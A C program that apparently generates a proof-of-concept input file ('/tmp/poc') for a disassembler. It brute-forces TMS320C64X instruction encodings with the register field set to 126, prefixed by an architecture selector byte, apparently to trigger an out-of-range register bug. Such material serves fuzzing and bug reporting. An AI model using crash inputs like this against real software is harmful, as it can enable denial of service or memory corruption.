#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* Generate all possible 4-byte TMS320C64X instructions with register field = 126 */
    /* For each opcode (0-15), try all combinations of dst (0-31), side (0-3), x (0-3), */
    /* src1 (0-63), src2 (0-63), and set base register = 126 */
    /* This brute-force approach ensures we cover all valid instruction formats */
    
    for (int opcode = 0; opcode < 16; opcode++) {
        for (int dst = 0; dst < 32; dst++) {
            for (int side = 0; side < 4; side++) {
                for (int x = 0; x < 4; x++) {
                    for (int src1 = 0; src1 < 64; src1++) {
                        for (int src2 = 0; src2 < 64; src2++) {
                            /* Architecture selector byte */
                            fputc(0x1B, f);
                            
                            /* Big-endian instruction word */
                            unsigned int word = 0;
                            word |= (opcode & 0xF) << 28;
                            word |= (dst & 0x1F) << 23;
                            word |= (side & 0x3) << 21;
                            word |= (x & 0x3) << 19;
                            word |= (src1 & 0x3F) << 13;
                            word |= (src2 & 0x3F) << 7;
                            word |= 126;  /* base register = 126 */
                            
                            /* Write in big-endian */
                            fputc((word >> 24) & 0xFF, f);
                            fputc((word >> 16) & 0xFF, f);
                            fputc((word >> 8) & 0xFF, f);
                            fputc(word & 0xFF, f);
                        }
                    }
                }
            }
        }
    }
    
    fclose(f);
    return 0;
}